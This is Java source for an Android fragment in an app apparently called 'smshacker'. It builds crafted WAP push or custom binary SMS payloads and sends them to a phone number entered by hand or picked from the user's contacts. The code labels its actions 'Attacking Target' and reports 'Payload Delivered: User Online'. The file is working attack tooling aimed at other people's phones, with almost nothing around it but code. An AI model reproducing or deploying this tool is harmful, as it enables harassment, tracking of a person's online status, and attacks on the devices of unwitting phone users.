package pk.development.pro.smshacker.frags;

import android.Manifest;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.design.widget.Snackbar;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.Fragment;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ScrollView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import java.util.Date;

import pk.development.pro.smshacker.R;
import pk.development.pro.smshacker.SmsUtils;

import static android.app.Activity.RESULT_OK;

public class NoobFrag extends Fragment {
    private static String[] PERMISSIONS = {
            android.Manifest.permission.SEND_SMS
    };

    private Button btnWapPushSend;
    private EditText editTextWapPushNumber, editMsg, editHeader, editUrl, editSize, editPayload;
    private TextView tvWapPushResult;
    private ScrollView scrollViewWapPush;
    private Spinner spinnerWapPush, spinnerWapPort;
    private Button imgBtnContact;
    private static final String TAG = "EVIL SMS";

    private PendingIntent attackingIntent;
    private PendingIntent infectedIntent;
    private static final int REQUEST_CONTACT_PICKER = 1000;
    private BroadcastReceiver delReportReceiver;
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        View root = inflater.inflate(R.layout.fragment_noob, container, false);

        editTextWapPushNumber  = root.findViewById(R.id.editTextWapPushNumber);
        editHeader = root.findViewById(R.id.editHeader);
        editMsg = root.findViewById(R.id.editMsg);
        editSize = root.findViewById(R.id.editSize);
        editUrl = root.findViewById(R.id.editUrl);
        editPayload = root.findViewById(R.id.editPayload);

        tvWapPushResult = root.findViewById(R.id.tvResultWapPush);
        scrollViewWapPush = root.findViewById(R.id.scrollViewWapPush);
        spinnerWapPush = root.findViewById(R.id.spinnerWapPush);
        spinnerWapPort = root.findViewById(R.id.spinnerWapPort);
        btnWapPushSend = root.findViewById(R.id.btnSendWapPush);
        imgBtnContact = root.findViewById(R.id.imgBtnContact);

        spinnerWapPush.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {

            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                editPayload.setText(SmsUtils.StringMessages[position]);
            }

            @Override
            public void onNothingSelected(AdapterView<?> parent) {

            }
        });

        imgBtnContact.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                selectContact();
            }
        });

        btnWapPushSend.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {


                tvWapPushResult.setText("");

                boolean custom = spinnerWapPush.getSelectedItemPosition() == 2;

                String header = editHeader.getText().toString();
                String msg = editMsg.getText().toString();
                byte[] pdu = custom ? SmsUtils.createCustomMessage(editPayload.getText().toString())
                        :SmsUtils.createSms(header, msg, editPayload.getText().toString());

                tvWapPushResult.setText(SmsUtils.hex(pdu));

                if(header.length()  == 0 || msg.length()  == 0) {
                    Toast.makeText(getActivity(),
                            (header.length() == 0)
                            ? "Please enter message title"
                            : "Please enter message text",
                            Toast.LENGTH_SHORT).show();

                    return;
                }

                if(header.length() > 18) {
                    Toast.makeText(getActivity(), "Header is to long 18 characters only", Toast.LENGTH_SHORT).show();
                    return;
                } else if(msg.length() > 88) {
                    Toast.makeText(getActivity(), "Message is to long 88 characters only", Toast.LENGTH_SHORT).show();
                    return;
                }

                if(editTextWapPushNumber.getText().toString().length() == 0) {
                    Toast.makeText(getActivity(), "Please enter a number", Toast.LENGTH_SHORT).show();

                } else {


                    Snackbar.make(v, "Building Payload....", Snackbar.LENGTH_LONG)
                            .setAction("Action", null).show();
                    SmsManager.getDefault().sendDataMessage(
                            editTextWapPushNumber.getText().toString(),
                            null,
                            SmsUtils.WAP_PORTS.get(spinnerWapPort.getSelectedItemPosition()),
                            pdu,
                            attackingIntent,
                            infectedIntent);

                }
            } });

        attackingIntent = PendingIntent.getBroadcast(getActivity(),
                0x5556, new Intent("evilsms.attacking"),
                PendingIntent.FLAG_CANCEL_CURRENT);

        infectedIntent = PendingIntent.getBroadcast(getActivity(), 0x5556, new Intent("evilsms.infected"),
                PendingIntent.FLAG_CANCEL_CURRENT);

        ActivityCompat.requestPermissions(getActivity(), PERMISSIONS, 0x1001 );

        delReportReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {

                if ("evilsms.attacking".equalsIgnoreCase(intent.getAction())) {
                    Snackbar.make(NoobFrag.this.getView(), "Attacking Target==>", Snackbar.LENGTH_LONG)
                            .setAction("Action", null).show();
                    Toast.makeText(getActivity(), "Attacking Target==>", Toast.LENGTH_SHORT).show();
                } else if ("evilsms.infected".equalsIgnoreCase(intent.getAction())) {
                    if (intent.hasExtra("pdu")) {
                        byte[] pdu = (byte[]) intent.getExtras().get("pdu");
                        if (pdu != null && pdu.length > 1) {
                            String msg =  (pdu[pdu.length-1] == 0x00)
                                    ? "Payload Delivered: User Online"
                                    : "Payload Failed: User Offline";

                            Snackbar.make(NoobFrag.this.getView(),msg, Toast.LENGTH_LONG ).show();
                            Toast.makeText(getActivity(), msg, Toast.LENGTH_SHORT).show();
                        }
                    }

                }

            }
        };

        return root;
    }



    @Override
    public void onResume() {
        super.onResume();
        startReceiver();
    }

    private void startReceiver() {

        try {
            if(delReportReceiver != null) getActivity().unregisterReceiver(delReportReceiver);
        } catch (Exception ex) {
            Log.e(NoobFrag.TAG, "Failed to stop receiver");
        }


        IntentFilter filter = new IntentFilter();
        filter.addAction("evilsms.attacking");
        filter.addAction("evilsms.infected");
        filter.addAction("android.provider.Telephony.WAP_PUSH_DELIVER");
        getActivity().registerReceiver(delReportReceiver, filter);
    }
    @Override
    public void onPause() {
        super.onPause();
        try {
            getActivity().unregisterReceiver(delReportReceiver);
        } catch (Exception ex) {
            Log.e(NoobFrag.TAG, "Failed to stop receiver");
        }

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            getActivity().unregisterReceiver(delReportReceiver);
        } catch (Exception ex) {
            Log.e(NoobFrag.TAG, "Failed to stop receiver");
        }
    }

    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case 0x1001: {
                if (!(grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                    Toast.makeText(getActivity(), "Please set all permissions", Toast.LENGTH_LONG).show();
                    try {
                        Intent intent = new Intent();
                        intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        Uri uri = Uri.fromParts("package", getActivity().getPackageName(), null);
                        intent.setData(uri);
                        startActivity(intent);
                    } catch(Exception ex) {
                        Log.e(TAG, "Error opening settings  intent");

                    }

                }
            }
        }
    }

    static final int REQUEST_SELECT_PHONE_NUMBER = 1;

    public void selectContact() {
        // Start an activity for the user to pick a phone number from contacts
        Intent intent = new Intent(Intent.ACTION_PICK);
        intent.setType(ContactsContract.CommonDataKinds.Phone.CONTENT_TYPE);
        if (intent.resolveActivity(getActivity().getPackageManager()) != null) {
            startActivityForResult(intent, REQUEST_SELECT_PHONE_NUMBER);
        }
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_SELECT_PHONE_NUMBER && resultCode == RESULT_OK) {
            // Get the URI and query the content provider for the phone number
            Uri contactUri = data.getData();
            String[] projection = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};
            Cursor cursor = getActivity().getContentResolver().query(contactUri, projection,
                    null, null, null);
            // If the cursor returned is valid, get the phone number
            if (cursor != null && cursor.moveToFirst()) {
                int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                editTextWapPushNumber.setText(cursor.getString(numberIndex));
            }
        }
    }
}
